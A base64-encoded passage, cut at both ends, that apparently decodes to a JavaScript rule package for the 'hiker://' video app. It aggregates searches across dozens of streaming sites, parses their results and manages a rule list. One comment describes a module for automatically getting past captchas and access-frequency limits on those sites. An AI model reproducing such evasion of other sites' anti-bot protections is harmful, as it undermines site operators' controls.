QQUdFO1xcbiAgICBsZXQge1xcbiAgICAgICAgbG9hZFxcbiAgICB9ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXCIpO1xcbiAgICBsZXQge1xcbiAgICAgICAgd3JhcFxcbiAgICB9ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvdG9vbFxcXCIpO1xcbiAgICBsZXQgZGF0YSA9IGxvYWQocCwgciAhPSBcXFwiXFxcIiA/IHIgOiBudWxsKTtcXG5cXG4gICAgbGV0IHBhZ2VpZCA9IE1ZX1JVTEUudGl0bGUgKyBcXFwiLXBhZ2VcXFwiICsgcDtcXG4gICAgaWYgKGRhdGEubGVuZ3RoID4gMCkge1xcbiAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuWKoOi9veesrFxcXCIgKyBwICsgXFxcIumhteS4re+8jOi/m+W6pu+8mjEvXFxcIiArIGRhdGEubGVuZ3RoLFxcbiAgICAgICAgICAgIHVybDogXFxcIlxcXCIsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgICAgICBkZXNjOiBcXFwiXFxcIixcXG4gICAgICAgICAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBpZDogcGFnZWlkXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgIH1cXG4gICAgc2V0UmVzdWx0KGQpO1xcbiAgICBsb2coZGF0YS5sZW5ndGgpO1xcbiAgICBpZiAoZGF0YS5sZW5ndGggPiAwKSB7XFxuICAgICAgICAvL+Wkmue6v+eoi+WKoOi9vSAgICAgICAgXFxuICAgICAgICBsZXQgcmVhbFBhZ2UgPSBcXFwiXFxcIiA9PSByID8gMSA6IHA7XFxuICAgICAgICBsZXQgdGFza3MgPSBkYXRhLm1hcChpdCA9PiB7XFxuICAgICAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICAgICAgZnVuYzogZnVuY3Rpb24ocnVsZSkge1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJ1bGUuZmluZChzLCByZWFsUGFnZSk7XFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIHBhcmFtOiBpdCxcXG4gICAgICAgICAgICAgICAgaWQ6IFxcXCJydWxlQFxcXCIgKyBpdC5uYW1lXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuXFxuICAgICAgICBiYXRjaEV4ZWN1dGUodGFza3MsIHtcXG4gICAgICAgICAgICBmdW5jOiBmdW5jdGlvbihwYXJhbSwgaWQsIGVycm9yLCByZXN1bHQpIHtcXG4gICAgICAgICAgICAgICAgLy9sb2coXFxcImxpc3RlbmVyOiBcXFwiICsgKHJlc3VsdCB8fCBbXSkubGVuZ3RoKVxcbiAgICAgICAgICAgICAgICBwYXJhbS5pID0gcGFyYW0uaSArIDE7XFxuICAgICAgICAgICAgICAgIGlmIChyZXN1bHQpIHtcXG4gICAgICAgICAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaXQgb2YgcmVzdWx0KSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtLmogPSBwYXJhbS5qICsgMTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkSXRlbUJlZm9yZShwYWdlaWQsIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiB3cmFwKGl0LnRpdGxlLCBzKSxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6IGl0LmRlc2MsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGl0LnVybCxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBpY191cmw6IGl0LnBpY191cmwsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogaXQucGljX3VybCA/ICdtb3ZpZV8xX3ZlcnRpY2FsX3BpYycgOiBcXFwidGV4dF8xXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhOiBpdC5leHRyYVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHt9XFxuXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgaWYgKHBhcmFtLmkgPj0gcGFyYW0uYWxsKSB7XFxuICAgICAgICAgICAgICAgICAgICBkZWxldGVJdGVtKHBhZ2VpZClcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5Yqg6L2956ysXFxcIiArIE1ZX1BBR0UgKyBcXFwi6aG15Lit77yM6L+b5bqm77yaXFxcIiArIChwYXJhbS5pICsgMSkgKyBcXFwiL1xcXCIgKyBwYXJhbS5hbGwsXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBcXFwiXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkOiBwYWdlaWRcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICBwYXJhbToge1xcbiAgICAgICAgICAgICAgICBhbGw6IGRhdGEubGVuZ3RoLFxcbiAgICAgICAgICAgICAgICBpOiAwLFxcbiAgICAgICAgICAgICAgICBqOiAtMVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pXFxuICAgIH1cXG59IGVsc2Uge1xcbiAgICBsZXQge1xcbiAgICAgICAgbG9hZFxcbiAgICB9ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXCIpO1xcbiAgICBsZXQgZGF0YSA9IGxvYWQoLTEsIG51bGwpO1xcbiAgICBpZiAoZGF0YS5sZW5ndGggPiAwKSB7XFxuICAgICAgICAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9tYW5hZ2VcXFwiKShkLCBkYXRhLm1hcChpdCA9PiBpdC5uYW1lKSk7XFxuICAgICAgICBmb3IgKGxldCBpdCBvZiBkYXRhKSB7XFxuICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGl0Lm5hbWUsXFxuICAgICAgICAgICAgICAgIHVybDogXFxcInNlbGVjdDovL1xcXCIgKyBKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuivt+mAieaLqeaTjeS9nFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBjb2w6IDEsXFxuICAgICAgICAgICAgICAgICAgICBvcHRpb25zOiBbXFxcIuiuv+mXrummlumhtVxcXCIsIFxcXCLmkJzntKLmraTnq5lcXFwiXSxcXG4gICAgICAgICAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKCh1cmwpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoaW5wdXQgPT0gXFxcIuiuv+mXrummlumhtVxcXCIpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgTVlfVVJMID0gdXJsO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcIng1Oi8vXFxcIiArIGdldEhvbWUodXJsKVxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL3NpbmdsZXNcXFwiXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfSwgaXQudXJsKVxcbiAgICAgICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJmbGV4X2J1dHRvblxcXCIsXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgICAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIFJVTEU6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBuYW1lOiBpdC5uYW1lLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogaXQudXJsXFxuICAgICAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICAgICAgbG9uZ0NsaWNrOiBbe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi56aB55SoXFxcIiArIGl0Lm5hbWUsXFxuICAgICAgICAgICAgICAgICAgICAgICAganM6ICQudG9TdHJpbmcoKG5hbWUpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uZmlybSh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIua4qemmqOaPkOekulxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50OiBcXFwi56Gu6K6k5Yig6Zmk56aB55SoXFxcIiArIG5hbWUgKyBcXFwi5ZCX77yfXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpcm06ICQudG9TdHJpbmcoKG5hbWUsIHJ1bGUpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZW1vdmVSdWxlXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL2RhdGE/cnVsZT1cXFwiICsgcnVsZSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVtb3ZlUnVsZShuYW1lKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly9PS1xcXCI7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCBuYW1lLCBNWV9SVUxFLnRpdGxlKVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGl0Lm5hbWUpXFxuICAgICAgICAgICAgICAgICAgICB9LCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLorr/pl67pppbpobVcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGpzOiBcXFwiJ3g1Oi8vXFxcIiArIGdldEhvbWUoaXQudXJsKSArIFxcXCInXFxcIlxcbiAgICAgICAgICAgICAgICAgICAgfSwge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5pCc57Si5q2k5rqQXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBqczogXFxcIidoaWtlcjovL3BhZ2Uvc2luZ2xlcydcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9XVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgIH1cXG59XFxuXFxuc2V0UmVzdWx0KGQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5pWw5o2uXCIsXCJwYXRoXCI6XCJkYXRhXCIsXCJydWxlXCI6XCIvL+W5tuWPkeinhOWImeaVsFxcbmxldCBzaXplMCA9IDEwO1xcbmxldCBydWxlc1RleHQwID0gYOeogOmlrUBodHRwczovL3d3dy54aWZhbnlzLmNvbS95aW5ncGlhbnNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXG7ovr7pvp9AaHR0cHM6Ly93d3cuZGFkYWd1aS5tZS92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqJnN1Ym1pdD1cXG7ln47luIJAaHR0cHM6Ly93d3cuY2l0eWR5LmNvbS9zZWFyY2guaHRtbD93ZD0qKlxcbmxpYnZpb0BodHRwczovL3d3dy5saWJ2aW8ubWUvc2VhcmNoLy0tLS0tLS0tLS0tLS0uaHRtbD93ZD0qKiZzdWJtaXQ9XFxu5paw6KeGQGh0dHBzOi8vd3d3LjYwODBkeTEuY29tL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXG7nnIvnnIt5QGh0dHBzOi8vd3d3LmtrZHkubGl2ZS92b2Qtc2VhcmNoLmh0bWw/d2Q9Kiomc3VibWl0PVxcbumlreWbokBodHRwczovL3d3dy5mYW50dWFuaGQuY29tL3NlYXJjaC5odG1sP3dkPSoqJnN1Ym1pdD1cXG7lhY3nmoRAaHR0cHM6Ly93d3cuZnJlZW9rLnZpcC92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqXFxu54mb6amsQGh0dHBzOi8vd3d3Lm5pdW1hdHYuY2Mvdm9kc2VhcmNoLmh0bWw/d2Q9Kiomc3VibWl0PVxcbuWFjei0uUBodHRwczovL3d3dy50aGVmcmVlLnZpcC92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqXFxu6I6r5omO5YWUQGh0dHBzOi8vd3d3Lm1vemhhdHUuY29tL2luZGV4LnBocC92b2Qvc2VhcmNoLmh0bWw/d2Q9KipcXG7pnLnpm7NAaHR0cHM6Ly9wbHlpbmdzaGkuY29tL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXG7ljoLplb9AaHR0cHM6Ly93d3cuY3pzcHAuY29tL3hzc2VhcmNoP3E9KipcXG5WT0ZAaHR0cHM6Ly93d3cudm9mbGl4LmNvbS9zZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqXFxu55S15b2xQGh0dHBzOi8vd3d3LmFwcG1vdmllLmNjL2luZGV4LnBocC92b2Qvc2VhcmNoLmh0bWw/d2Q9Kiomc3VibWl0PVxcbui/veWJp0BodHRwOi8vempkci52aXAvdm9kL3NlYXJjaC93ZC8qKi5odG1sXFxu55av54uXQGh0dHBzOi8vbS5mZW5nZ291ZHkzLmNvbS9pbmRleC5waHA/cz12b2Qtc2VhcmNoLW5hbWUmd2Q9KipcXG7lnKjnur9AaHR0cHM6Ly96eHpqLnZpcC92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqJnN1Ym1pdD1cXG7kuIPkuINAaHR0cDovL2FhYXNvZmEuY29tL3NlYXJjaC5waHBcXG7ljJflt51AaHR0cHM6Ly93d3cuYmN3emcuY29tL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLz93ZD0qKlxcbkVGQGh0dHBzOi8vd3d3LnBpbGk1LmNuL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9Kiomc3VibWl0PVxcbuW9seWutkBodHRwOi8veXN6anZpcC5jb20vaW5kZXgucGhwL3ZvZC9zZWFyY2guaHRtbD93ZD0qKlxcbuS6lOS6lEBodHRwczovLzU1NWR5LmNjL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXG7muKPmvKtAaHR0cHM6Ly93d3cuZG0yMDIyLmNvbS92b2RzZWFyY2guaHRtbD93ZD0qKlxcbuWcqOWutkBodHRwczovL3p4emoudmlwL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9Kiomc3VibWl0PVxcbnBpYeW6k0BodHRwczovL20ucGlha3UuY2Mvcy8tLS0tLS0tLS0tLS0tLz93ZD0qKlxcbuaegeWTgUBodHRwczovL3d3dy5qcHlzLm1lL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXG7oib7ov6pAaHR0cHM6Ly9haWRpLnR2L3ZzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqJnN1Ym1pdD1cXG7kuZ3lt55AaHR0cDovL3d3dy5qaXV6aG91OTExLmNvbS9zZWFyY2gucGhwP3NlYXJjaHdvcmQ9KipcXG7ljYHljYNAaHR0cDovL3d3dy5xaWFuc2hpaG91c2UuY29tL3NyaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXG7puqbniYdAaHR0cDovL20ubHkzNjguY29tL2luZGV4LnBocD9zPXZvZC1tX3MtbmFtZSZ3ZD0qKlxcbuengeS6ukBodHRwczovL3NvdW1rLmNvbS92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqXFxu5pif6L6wQGh0dHA6Ly93d3cucWhkZGouY29tLmNuL3hjeXlzZWFyY2gvKiotLS0tLS0tLS0tLS0tLmh0bWxcXG5Db2tldllAaHR0cHM6Ly9jb2tlbXYubWUvdm9kc2VhcmNoLy0tLS0tLS0tLS0tLS0uaHRtbD93ZD0qKlxcbueIseeci3lAaHR0cHM6Ly9pa2FuNi52aXAvdm9kc2VhcmNoLy0tLS0tLS0tLS0tLS0vP3dkPSoqJnN1Ym1pdD1cXG7lubLppa1weUBodHRwczovL3d3dy5nZnlzeXMxLmNvbS92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqXFxu5aSp56m6eUBodHRwOi8vdGt6bnAuY29tL3ZvZHNlYXJjaC5odG1sP3dkPSoqXFxu6JOd5YWJQGh0dHBzOi8vd3d3LmxneXkuY2Mvdm9kc2VhcmNoLy0tLS0tLS0tLS0tLS0uaHRtbD93ZD0qKlxcbuS9juerr0BodHRwczovL2RkeXMudHYvP3M9KiomcG9zdF90eXBlPXBvc3RcXG7liqrliqpAaHR0cHM6Ly93d3cubnVudXl5My5vcmcvc28vKiotKiotLS5odG1sYDtcXG5sZXQgcnVsZXNUZXh0ID0gZ2V0SXRlbShcXFwicnVsZXNcXFwiLCBydWxlc1RleHQwKTtcXG5sZXQgc3AgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9zcFxcXCIpO1xcbnJ1bGVzID0gcnVsZXNUZXh0LnNwbGl0KFxcXCJcXFxcblxcXCIpXFxuICAgIC5maWx0ZXIoaXQgPT4gaXQuaW5jbHVkZXMoXFxcIkBcXFwiKSlcXG4gICAgLm1hcChydWxlID0+IHtcXG4gICAgICAgIGxldCBzID0gcnVsZS5zcGxpdChcXFwiQFxcXCIpO1xcbiAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICBuYW1lOiBzWzBdLFxcbiAgICAgICAgICAgIGZpbmQ6IGZ1bmN0aW9uKGtleSwgcGFnZSkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gc3Aoc1sxXSwga2V5LCBzWzBdKTtcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICAgIHVybDogc1sxXVxcbiAgICAgICAgfTtcXG4gICAgfSk7XFxuXFxuZnVuY3Rpb24gbG9hZChwYWdlLCBydWxlKSB7XFxuICAgIGxldCBzaXplID0gcGFnZSA8PSAwID8gcnVsZXMubGVuZ3RoIDogc2l6ZTA7XFxuICAgIHBhZ2UgPSBwYWdlIDw9IDAgPyAxIDogcGFnZTtcXG4gICAgaWYgKCFwYWdlICYmICFydWxlKSB7XFxuICAgICAgICByZXR1cm4gcnVsZXMubWFwKGl0ID0+IGl0Lm5hbWUpO1xcbiAgICB9XFxuICAgIGlmIChydWxlICE9IG51bGwpIHtcXG4gICAgICAgIGlmIChwYWdlICE9IG51bGwgJiYgcGFnZSA+IDEpIHtcXG4gICAgICAgICAgICByZXR1cm4gcnVsZXMuZmlsdGVyKGkgPT4gaS5uYW1lID09IHJ1bGUgJiYgaS5wYWdlKTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBydWxlcy5maWx0ZXIoaSA9PiBpLm5hbWUgPT0gcnVsZSk7XFxuICAgIH1cXG4gICAgbGV0IHN0YXJ0ID0gKHBhZ2UgLSAxKSAqIHNpemU7XFxuICAgIGlmIChydWxlcy5sZW5ndGggPCBzdGFydCArIDEpIHtcXG4gICAgICAgIHJldHVybiBbXTtcXG4gICAgfVxcbiAgICBsZXQgbGVuID0gc2l6ZTtcXG4gICAgaWYgKHJ1bGVzLmxlbmd0aCA8IHBhZ2UgKiBzaXplKSB7XFxuICAgICAgICBsZW4gPSBydWxlcy5sZW5ndGggLSBzdGFydFxcbiAgICB9XFxuICAgIHJldHVybiBydWxlcy5zbGljZShzdGFydCwgc3RhcnQgKyBsZW4pO1xcbn1cXG5cXG5mdW5jdGlvbiBhZGRSdWxlKG5hbWUsIHN1cmwpIHtcXG4gICAgc2V0SXRlbShcXFwicnVsZXNcXFwiLCBydWxlc1RleHQgKyBcXFwiXFxcXG5cXFwiICsgbmFtZSArIFxcXCJAXFxcIiArIHN1cmwpO1xcbn1cXG5cXG5mdW5jdGlvbiByZW1vdmVSdWxlKG5hbWUpIHtcXG4gICAgbGV0IG5ld1QgPSBydWxlc1RleHQuc3BsaXQoXFxcIlxcXFxuXFxcIilcXG4gICAgICAgIC5maWx0ZXIoaXQgPT4gaXQuaW5kZXhPZihuYW1lICsgXFxcIkBcXFwiKSA8IDApXFxuICAgICAgICAuam9pbihcXFwiXFxcXG5cXFwiKTtcXG4gICAgc2V0SXRlbShcXFwicnVsZXNcXFwiLCBuZXdUKTtcXG59XFxuXFxuJC5leHBvcnRzID0ge1xcbiAgICBsb2FkOiBsb2FkLFxcbiAgICBhZGRSdWxlOiBhZGRSdWxlLFxcbiAgICByZW1vdmVSdWxlOiByZW1vdmVSdWxlXFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5pCc57Si6Kej5p6QXCIsXCJwYXRoXCI6XCJzcFwiLFwicnVsZVwiOlwiZnVuY3Rpb24gc2VhcmNoKHVybCwga2V5LCBydWxlKSB7XFxuICAgIGxldCBkID0gW107XFxuICAgIGxldCBodG1sID0gXFxcIlxcXCI7XFxuICAgIGlmICh1cmwuaW5jbHVkZXMoXFxcIioqXFxcIikpIHtcXG4gICAgICAgIC8vZ2V06K+35rGCXFxuICAgICAgICBsZXQgb2xkID0gdXJsO1xcbiAgICAgICAgdXJsID0gdXJsLnJlcGxhY2UoXFxcIioqXFxcIiwga2V5KTtcXG4gICAgICAgIGh0bWwgPSByZXF1ZXN0KHVybCk7XFxuICAgICAgICAvL+iHquWKqOi/h+mqjOivgeeggeWSjOmikee5geiuv+mXrumZkOWItlxcbiAgICAgICAgbGV0IHtcXG4gICAgICAgICAgICBjaGVjayxcXG4gICAgICAgICAgICB0ZXN0XFxuICAgICAgICB9ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UveXptXFxcIik7XFxuICAgICAgICBpZiAoY2hlY2sodXJsLCBodG1sLCBkKSkge1xcbiAgICAgICAgICAgIGxvZyhcXFwi6YeN6K+V5LqGXFxcIik7XFxuICAgICAgICAgICAgaHRtbCA9IHJlcXVlc3QodXJsLCB7XFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJSZWZlcmVyXFxcIjogdXJsXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgICAgIHRlc3QodXJsLCBodG1sLCBkLCBvbGQsIGtleSwgcnVsZSk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICAvL+iHquWKqOivhuWIq3Bvc3Tor7fmsYJcXG4gICAgICAgIGh0bWwgPSByZXF1ZXN0KHVybCk7XFxuICAgICAgICBsZXQgZm9ybSA9IHBkZmgoaHRtbCwgXFxcImJvZHkmJmZvcm0mJkh0bWxcXFwiKTtcXG4gICAgICAgIGxldCBhY3Rpb24gPSBwZChodG1sLCBcXFwiZm9ybSYmYWN0aW9uXFxcIiwgdXJsKTtcXG4gICAgICAgIGxldCBpbnB1dHMgPSBwZGZhKGh0bWwsIFxcXCJib2R5JiZmb3JtJiZpbnB1dFxcXCIpO1xcbiAgICAgICAgbGV0IGJvZHkgPSB7fTtcXG4gICAgICAgIGZvciAobGV0IGl0IG9mIGlucHV0cykge1xcbiAgICAgICAgICAgIGxldCBuYW1lID0gcGRmaChpdCwgXFxcImlucHV0JiZuYW1lXFxcIik7XFxuICAgICAgICAgICAgaWYgKG5hbWUgJiYgbmFtZSAhPSBcXFwiXFxcIikge1xcbiAgICAgICAgICAgICAgICBsZXQgdmFsdWUgPSBwZGZoKGl0LCBcXFwiaW5wdXQmJnZhbHVlXFxcIik7XFxuICAgICAgICAgICAgICAgIGJvZHlbbmFtZV0gPSB2YWx1ZSB8fCBrZXk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgaHRtbCA9IHBvc3QoYWN0aW9uLCB7XFxuICAgICAgICAgICAgYm9keTogYm9keVxcbiAgICAgICAgfSk7XFxuICAgIH1cXG5cXG4gICAgbGV0IGFsaXN0ID0gcGRmYShodG1sLCBcXFwiYm9keSYmYVxcXCIpO1xcbiAgICBsZXQgYXJyID0gYWxpc3QubWFwKGl0ID0+IHtcXG4gICAgICAgIGxldCB0ID0gcGRmaChpdCwgXFxcImEmJlRleHRcXFwiKTtcXG4gICAgICAgIGxldCB0MiA9IHBkZmgoaXQsIFxcXCJhJiZ0aXRsZVxcXCIpO1xcbiAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICAvL2h0bWw6IGl0LFxcbiAgICAgICAgICAgIHRleHQ6IHQyICYmIHQyLmluY2x1ZGVzKGtleSkgPyB0MiA6IHQsXFxuICAgICAgICAgICAgaHJlZjogcGQoaXQsIFxcXCJhJiZocmVmXFxcIiwgdXJsKVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG5cXG4gICAgZnVuY3Rpb24gaXNSZXN1bHQoaXQpIHtcXG4gICAgICAgIGl0ID0gaXQudGV4dCB8fCBcXFwiXFxcIjtcXG4gICAgICAgIGlmIChpdCA9PSBcXFwiXFxcIiB8fCBpdC5tYXRjaCgv5pCc57SifOe7k+aenC8pKSB7XFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlXFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gaXQuaW5jbHVkZXMoa2V5KTtcXG4gICAgfVxcblxcbiAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyci5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcbiAgICAgICAgbGV0IHQgPSBpdC50ZXh0O1xcbiAgICAgICAgaWYgKCFpdC5ocmVmIHx8IGl0LmhyZWYgPT0gXFxcIlxcXCIpIHtcXG4gICAgICAgICAgICBjb250aW51ZTtcXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChpc1Jlc3VsdChpdCkpIHtcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogdCxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL3A/dT1cXFwiICsgYmFzZTY0RW5jb2RlKGl0LmhyZWYpICsgXFxcIiZtb3Z0aXRsZT1cXFwiICsgYmFzZTY0RW5jb2RlKHQpLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCIsXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLigJzigJzigJ3igJ08Zm9udCBjb2xvcj0jZjEzYjY2YT5cXFwiICsgcnVsZSArIFxcXCI8L2ZvbnQ+XFxcIixcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIGluaGVyaXRUaXRsZTogZmFsc2VcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIHJldHVybiBkO1xcbn1cXG4kLmV4cG9ydHMgPSBzZWFyY2g7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLlop7liKBcIixcInBhdGhcIjpcIm1hbmFnZVwiLFwicnVsZVwiOlwiJC5leHBvcnRzID0gZnVuY3Rpb24oZCwgbmFtZXMpIHtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwiQUnmioDmnK9cXFwiLFxcbiAgICAgICAgdXJsOiBcXFwiY29uZmlybTovL+WfuuS6jkFJ6K+G54mH6Ieq5Yqo5YiG5p6Q5rqQ56CB5oqA5pyv77yM5Luj56CB5a6M5YWo5byA5rqQ77yM5pWw5o2u5p2l5rqQ5LqO5Y6f572R56uZ77yM6L2v5Lu25